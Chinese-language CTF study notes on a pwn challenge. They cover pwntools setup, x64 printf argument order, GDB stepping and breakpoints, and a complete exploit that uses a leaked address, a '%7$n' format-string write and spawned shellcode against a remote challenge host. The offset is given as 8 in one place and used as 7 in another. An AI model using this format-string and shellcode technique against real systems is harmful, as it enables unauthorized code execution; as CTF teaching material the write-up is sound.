# 📝 Pwn 挑战学习笔记：格式化字符串与 Shellcode 综合利用

**挑战概述**：本题结合了信息泄露、格式化字符串漏洞（任意地址写）以及 Shellcode 执行。通过泄露的地址计算目标地址，利用格式化字符串漏洞修改内存数据（绕过判断逻辑），最终通过发送 Shellcode 拿到服务器的 Shell。

## 一、 Pwntools 脚本编写核心技巧

### 1. 调试环境与架构配置

在编写 64 位 Pwn 脚本时，开头必备的“四大金刚”：

Python

```
context.log_level = 'debug'  # 开启 debug 模式，打印所有收发的数据（排错神器）
context.arch = 'amd64'       # 指定架构为 64 位，这决定了后续 asm() 编译 shellcode 和 p64() 的行为
context.terminal = ['tmux', 'splitw', '-h'] # 指定 GDB 弹出的终端方式（使用 tmux 右侧分屏）
# gdb.attach(p)              # 随时在脚本中挂载 GDB 进行动态调试
```

- **拓展**：`context.arch` 不仅影响 Shellcode，当你使用 `fmtstr_payload` 自动生成格式化字符串 payload 时，它也依赖这个设置来决定生成 4 字节还是 8 字节的地址。

### 2. 精准的数据提取与转换

**场景**：程序输出 `secret[0] is 312c72a0\n`，我们需要拿到这个 16 进制数并进行数学计算。

Python

```
address = int(p.recvline().strip(), 16)
```

- **原理解析**：
  - `recvline()` 会读取一整行，包含末尾的换行符 `\n`。
  - `.strip()` 去除首尾的空白字符和换行符，保证字符串纯净。
  - `int(..., 16)` 将这串 16 进制形式的**字符串**转化成了 Python 中的**整型数字**，方便后续做加减法（如 `address + 4`）。

### 3. 数据发送的类型对齐

**场景**：我们要把刚才算出来的整型地址发给程序（C 语言的 `scanf` 或 `read`）。

Python

```
p.sendlineafter(b"'Give me an address'", str(address).encode())
```

- **原理解析**：网络传输只认**字节流（Bytes）**。不能直接发数字。
  - `str(address)`：先将 Python 整型转为可见的字符串（模拟人类在键盘上敲击数字）。
  - `.encode()`：将字符串编码为字节流（加上 `b''` 前缀的效果）。

### 4. x64 格式化字符串漏洞原理

在 64 位下，`printf` 的参数传递顺序是核心难点：

- **传参顺序**：`RDI` (格式化字符串本身) -> `RSI` -> `RDX` -> `RCX` -> `R8` -> `R9` -> **栈 (Stack)**。
- **结论**：因为前 6 个参数在寄存器里，所以用户输入的数据（通常在栈上）的偏移**至少是从 6 开始的**。本题中测算出的偏移为 **8**（即 `%8$p` 或本题用的 `%7$n` 配合前面的字符进行精确定位）。

------

## 二、 GDB 动态调试心得

### 1. 控制执行流的三剑客：ni / si / fin

在汇编界面中，这是最常用的步进命令：

- **`ni` (Next Instruction)**：**步过**。把 `call` 函数当作一条普通指令，直接执行完整个函数，不看内部细节（调试 `printf`、`puts` 等库函数时常用）。
- **`si` (Step Instruction)**：**步入**。遇到 `call` 会跳进函数内部，适合观察自定义函数的执行逻辑。
- **`fin` (Finish)**：**运行到返回**。如果不小心 `si` 进错了函数，输入 `fin` 会全速执行完当前函数并退出来。

### 2. 内存观察神器：x 命令

- **指令**：`x/20gx 地址或寄存器` （例如 `x/20gx $rsp`）。
- **解析**：`20` 表示查看 20 个单位，`g` 表示每个单位是 8 字节（Giant word，64位必备），`x` 表示以 16 进制显示。
- **应用**：寻找格式化字符串在栈上的偏移时，在 `printf` 处下断点，然后 `x/20gx $rsp`，数一数第几个 8 字节是你输入的 `aaaa`（`0x61616161`）。

### 3. 🛡️ 【拓展】下断点（Breakpoint）进阶指南

针对你提到的“下断点还需要继续学习”，这里总结 3 个最实用的姿势：

1. **已知具体地址下断点**（未开启 PIE 时）：
   - 在 IDA 中看到 `main` 函数某条关键指令的地址是 `0x401234`。
   - GDB 运行：`b *0x401234`
2. **函数名下断点**（有符号表时）：
   - 直接在某个函数开头停下：`b main` 或 `b printf`。
3. **程序开启了 PIE（地址随机化）时怎么下？**
   - Pwntools 提供了一个绝招：不用在 GDB 里算基址，直接在脚本里写偏移。
   - 比如 IDA 里看地址是 `0x1234`（相对于文件开头的偏移），在脚本里这样写： `gdb.attach(p, 'b *$rebase(0x1234)\nc')`

------

## 三、 最终 Exploit (EXP)

Python

```
from pwn import *

# 1. 环境配置与连接
context.log_level = 'debug'
context.arch = 'amd64'
# p = process('./case') # 本地测试
p = remote('61.147.171.105', '53629') # 远程打靶

# context.terminal = ['tmux', 'splitw', '-h'] # 本地调试时取消注释

# 2. 捕获并解析泄露的地址
p.recvuntil(b"secret[0] is ")
# 接收一行，去除换行符，并按 16 进制转为整型
address = int(p.recvline().strip(), 16) 

# gdb.attach(p) # 调试断点位置
# pause()

# 3. 跑通游戏前期剧情
p.sendlineafter(b"What should your character's name be:", b"shuxian")
p.sendlineafter(b"So, where you will go?east or up?:", b"east")
p.sendlineafter(b"go into there(1), or leave(0)?:", b"1")

# 4. 发送转换好的目标地址
p.sendlineafter(b"'Give me an address'", str(address).encode())

# 5. 格式化字符串漏洞触发（任意地址写）
# 利用偏移 7 将前面 85 个 'a' 的长度写入之前提供的地址中，满足程序的判断条件
payload = b'a'*85 + b'%7$n'
p.sendlineafter(b"And, you wish is:", payload)

# 6. 发送 Shellcode 拿 Shell
shellcode = asm(shellcraft.sh())
p.recvuntil(b"Wizard: I will help you! USE YOU SPELL\n")
p.sendline(shellcode)

# 7. 进入交互模式
p.interactive()
```

------

### 下一步的进阶建议

从你的 EXP 来看，你非常聪明地用 `b'a'*85 + b'%7$n'` 这种手动构造的方式绕过了逻辑，拿到了 shellcode 的执行权限，恭喜拿下这题！🎉

下次遇到类似的格式化字符串题目，如果需要写入的数字很大（比如要把某个变量改成 `0x1337`，总不能打印几千个 `a`），你可以尝试学习使用 pwntools 的神仙函数：**`fmtstr_payload(offset, {address: value})`**。

继续保持这种“做完题写总结”的习惯，你会进步得飞快！有什么其他题目或者想深入探讨的机制，随时找我。